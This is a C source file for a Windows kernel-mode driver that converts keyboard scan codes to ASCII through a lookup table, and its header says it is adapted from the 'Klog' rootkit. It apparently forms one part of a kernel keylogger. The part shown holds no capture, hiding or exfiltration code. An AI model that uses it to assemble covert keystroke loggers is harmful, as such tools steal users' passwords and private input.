/*
 * Module: obscancode.c
 * Author: Christopher Wood
 * Description: Keyboard scan code.
 * Environment: Kernel mode only
 *
 * Adapted from Klog rootkit by Clandestine
 */

#include "driver.h"
#include "scancode.h"
#include "ntddkbd.h"

/* Regular scan code map */
#define INVALID 0X00 // scan code not supported by this driver
#define SPACE 0X01 // space bar
#define ENTER 0X02 // enter key
#define LSHIFT 0x03 // left shift key
#define RSHIFT 0x04 // right shift key
#define CTRL  0x05 // control key
#define ALT	  0x06 // alt key

char KeyMap[84] = {
INVALID, //0
INVALID, //1
'1', //2
'2', //3
'3', //4
'4', //5
'5', //6
'6', //7
'7', //8
'8', //9
'9', //A
'0', //B
'-', //C
'=', //D
INVALID, //E
INVALID, //F
'q', //10
'w', //11
'e', //12
'r', //13
't', //14
'y', //15
'u', //16
'i', //17
'o', //18
'p', //19
'[', //1A
']', //1B
ENTER, //1C
CTRL, //1D
'a', //1E
's', //1F
'd', //20
'f', //21
'g', //22
'h', //23
'j', //24
'k', //25
'l', //26
';', //27
'\'', //28
'`', //29
LSHIFT,	//2A
'\\', //2B
'z', //2C
'x', //2D
'c', //2E
'v', //2F
'b', //30
'n', //31
'm' , //32
',', //33
'.', //34
'/', //35
RSHIFT, //36
INVALID, //37
ALT, //38
SPACE, //39
INVALID, //3A
INVALID, //3B
INVALID, //3C
INVALID, //3D
INVALID, //3E
INVALID, //3F
INVALID, //40
INVALID, //41
INVALID, //42
INVALID, //43
INVALID, //44
INVALID, //45
INVALID, //46
'7', //47
'8', //48
'9', //49
INVALID, //4A
'4', //4B
'5', //4C
'6', //4D
INVALID, //4E
'1', //4F
'2', //50
'3', //51
'0', //52
};

/*
 * Convert scan code to the correct ASCII character
 *
 * @param pDevExt - device extension for this driver object
 * @param keyData - structure containing information about keystroke
 * @param keys - array of chars pressed (typically sizeof == 1?)
 */
VOID
ConvertScanCode(
	IN  PDEVICE_EXTENSION  pDevExt,  // for use with extended key map
	IN  PKEY_DATA          keyData,
	OUT char*              keys
	)
{
    //TODO: add to account for extended key map (not just basic chars)
	char key = 0;

	// Get the corresponding key from the scan code
	key = KeyMap[keyData->KeyData];

	keys[0] = key;
}//end ConvertScanCodeToKeyCode
